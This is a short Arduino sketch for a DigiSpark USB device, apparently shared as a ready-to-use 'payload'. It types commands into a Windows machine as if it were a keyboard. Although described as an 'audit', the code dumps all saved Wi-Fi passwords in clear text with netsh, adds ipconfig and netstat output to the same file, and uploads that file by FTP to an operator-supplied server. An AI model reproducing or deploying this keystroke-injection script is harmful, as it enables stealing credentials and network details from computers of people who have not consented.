/*
 * Date: 13.06.2018
 * Author: __z01db3rg
 * Title: __c0rn3lPlague2
 * Description: Using an arduino DigiSpark makes an audit of the pc internet
 * connection: all the active connections / ip config / wlan connections
 * Compatibility: win10/win7
 * Variables for integration with what you want:
 * All commented in the patload
 * !!!IMPORTANT -> for this payload you need to use a ftp server ->
 * there s where the data will be sent
 */
#include "DigiKeyboard.h"

int delayPause = 2000;

void setup() {
  // put your setup code here, to run once:
}

void loop() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print("netsh wlan show profile name = * key = clear > D:\\__c0rn3l1nho.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  
  /*
   * CHECKPOINT
   * comment everything from this checkpoint to the next one to
   * get only the wifi aps
   */
   
   DigiKeyboard.print("ipconfig /all >> D:\\__c0rn3l1nho.txt");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(delayPause / 2);
   DigiKeyboard.print("netstat -an >> D:\\__c0rn3l1nho.txt");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(delayPause / 2);

  //TODO: REMOVE WHEN NOT TESTING!!!
  // DigiKeyboard.print("time /t >> D:\\__c0rn3l1nho.txt");
  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // DigiKeyboard.delay(delayPause / 2);
   
   /*
    * CHECKPOINT
    */

  DigiKeyboard.print("ftp "); //put your ftp server's ip here
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print(""); //put your username
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print(""); //put your passwd
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  
  DigiKeyboard.print("put D:\\__c0rn3l1nho.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  DigiKeyboard.print("quit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delayPause / 2);
  for(;;){ /*empty*/ }
}
